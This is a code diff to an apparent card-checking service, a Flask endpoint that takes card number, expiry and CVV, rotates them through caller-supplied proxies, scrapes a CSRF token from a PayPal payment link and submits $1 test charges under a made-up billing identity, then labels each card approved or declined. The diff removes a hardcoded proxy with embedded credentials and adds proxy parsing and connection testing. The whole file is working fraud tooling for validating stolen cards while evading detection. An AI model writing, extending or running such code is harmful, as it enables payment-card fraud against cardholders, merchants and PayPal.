@@ -3,7 +3,7 @@ import json
 import logging
 import re
 import time
-from flask import Flask, jsonify
+from flask import Flask, jsonify, request
 
 # Configure logging
 logging.basicConfig(
@@ -13,12 +13,6 @@ logging.basicConfig(
 
 # Initialize Flask App
 app = Flask(__name__)
-
-# --- Proxy Configuration ---
-PROXY_CONFIG = {
-    'http': 'http://k4lnx:rockyalways@TITS.OOPS.WTF:6969',
-    'https': 'http://k4lnx:rockyalways@TITS.OOPS.WTF:6969'
-}
 
 # --- Status Mapping Rules ---
 # Define the sets of codes for each status
@@ -30,12 +24,43 @@ DECLINED_CODES = {
     "VALIDATION_ERROR",
     "LOGIN_ERROR",
     "RISK_DISALLOWED",
-    "TOKEN_EXTRACTION_ERROR",  # Added
-    "NETWORK_ERROR",           # Added
-    "INTERNAL_ERROR",          # Added
-    "INVALID_MONTH",           # Added
-    "UNKNOWN_ERROR"            # Added
+    "TOKEN_EXTRACTION_ERROR",
+    "NETWORK_ERROR",
+    "INTERNAL_ERROR",
+    "INVALID_MONTH",
+    "UNKNOWN_ERROR"
 }
+
+def parse_proxy_string(proxy_string):
+    """Parses a proxy string 'ip:port:user:pass' into a requests-compatible dictionary."""
+    try:
+        parts = proxy_string.split(':')
+        if len(parts) != 4:
+            raise ValueError("Invalid format. Expected ip:port:user:pass")
+        
+        ip, port, user, password = parts
+        proxy_url = f"http://{user}:{password}@{ip}:{port}"
+        return {'http': proxy_url, 'https': proxy_url}
+    except Exception as e:
+        logging.error(f"Error parsing proxy string '{proxy_string}': {e}")
+        raise ValueError(f"Could not parse proxy string: {e}")
+
+def check_proxy_connection(proxy_config):
+    """Tests a connection to the outside world using the provided proxy."""
+    try:
+        logging.info("Testing proxy connection...")
+        # Using httpbin.org as a reliable endpoint to check external IP
+        response = requests.get(
+            'http://httpbin.org/ip', 
+            proxies=proxy_config, 
+            timeout=10
+        )
+        response.raise_for_status()
+        logging.info(f"Proxy connection successful. External IP: {response.json()['origin']}")
+        return True
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Proxy connection failed: {e}")
+        return False
 
 def extract_csrf_token(html_content):
     """Extract CSRF token from HTML content with multiple patterns."""
@@ -60,9 +85,9 @@ def extract_csrf_token(html_content):
         logging.error(f"Error extracting CSRF token: {e}")
         return None
 
-def process_paypal_payment(card_details_string):
+def process_paypal_payment(card_details_string, proxy_config):
     """
-    Processes the PayPal payment using the provided card details string.
+    Processes the PayPal payment using the provided card details and proxy.
     The string should be in the format: 'card_number|mm|yy|cvv'
     Returns a dictionary with 'code' and 'message' from the PayPal response.
     """
@@ -90,7 +115,7 @@ def process_paypal_payment(card_details_string):
     # --- 2. Execute PayPal Request Sequence with Comprehensive Retry Logic ---
     
     session = requests.Session()
-    session.proxies.update(PROXY_CONFIG)  # Add proxy configuration to the session
+    session.proxies.update(proxy_config) # Use the provided proxy for the entire session
     token = None
     
     max_acquisition_retries = 3
@@ -105,7 +130,7 @@ def process_paypal_payment(card_details_string):
                 'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
             }
             try:
-                response = session.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', headers=headers, timeout=15, proxies=PROXY_CONFIG)
+                response = session.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', headers=headers, timeout=15)
                 response.raise_for_status()
                 csrf_token = extract_csrf_token(response.text)
                 if csrf_token:
@@ -132,16 +157,16 @@ def process_paypal_payment(card_details_string):
             'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
             'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'x-csrf-token': csrf_token, # Use the dynamically extracted token
+            'x-csrf-token': csrf_token,
         }
         json_data = {
-            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1', # Note: amount is 1 here
+            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1',
             'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD',
             'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
         }
         
         try:
-            response = session.post('https://www.paypal.com/ncp/api/create-order', cookies=session.cookies, headers=headers, json=json_data, timeout=10, proxies=PROXY_CONFIG)
+            response = session.post('https://www.paypal.com/ncp/api/create-order', cookies=session.cookies, headers=headers, json=json_data, timeout=10)
             response.raise_for_status()
             response_data = response.json()
         except requests.exceptions.RequestException as e:
@@ -183,7 +208,6 @@ def process_paypal_payment(card_details_string):
         'x-app-name': 'standardcardfields', 'x-country': 'US',
     }
 
-    # --- FIX: The complete, correctly formatted GraphQL query ---
     graphql_query = """
     mutation payWithCard(
         $token: String!
@@ -248,7 +272,7 @@ def process_paypal_payment(card_details_string):
     json_data = {
         'query': graphql_query.strip(),
         'variables': {
-            'token': token, 'card': card_details, 'phoneNumber': '4073320637', # Note: phone number is different
+            'token': token, 'card': card_details, 'phoneNumber': '4073320637',
             'firstName': 'Rockcy', 'lastName': 'og',
             'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
             'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
@@ -257,7 +281,7 @@ def process_paypal_payment(card_details_string):
     }
     
     try:
-        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=session.cookies, headers=headers, json=json_data, timeout=20, proxies=PROXY_CONFIG)
+        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=session.cookies, headers=headers, json=json_data, timeout=20)
         response_data = response.json()
     except (ValueError, requests.exceptions.RequestException) as e:
         logging.error(f"Final GraphQL request failed: {e}. Response: {response.text}")
@@ -278,12 +302,29 @@ def process_paypal_payment(card_details_string):
 def payment_gateway(card_details):
     """
     Main endpoint to process a payment.
-    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}
+    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}?proxy={ip:port:user:pass}
     """
+    # 1. Get and validate the proxy parameter
+    proxy_string = request.args.get('proxy')
+    if not proxy_string:
+        logging.error("Request denied: Proxy parameter is missing.")
+        return jsonify({"error": "Proxy parameter is required. Format: ?proxy=ip:port:user:pass"}), 400
+
+    try:
+        proxy_config = parse_proxy_string(proxy_string)
+    except ValueError as e:
+        logging.error(f"Request denied: {e}")
+        return jsonify({"error": str(e)}), 400
+
+    if not check_proxy_connection(proxy_config):
+        logging.error("Request denied: Proxy connection test failed.")
+        return jsonify({"error": "Proxy connection failed. Please check the proxy details."}), 503 # 503 Service Unavailable
+
+    # 2. Process the payment if proxy is valid
     last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
-    logging.info(f"Received payment request for card ending in {last_four}")
+    logging.info(f"Received payment request for card ending in {last_four} via proxy.")
     
-    result = process_paypal_payment(card_details)
+    result = process_paypal_payment(card_details, proxy_config)
     
     code = result.get('code')
     if code in APPROVED_CODES: status = 'approved'
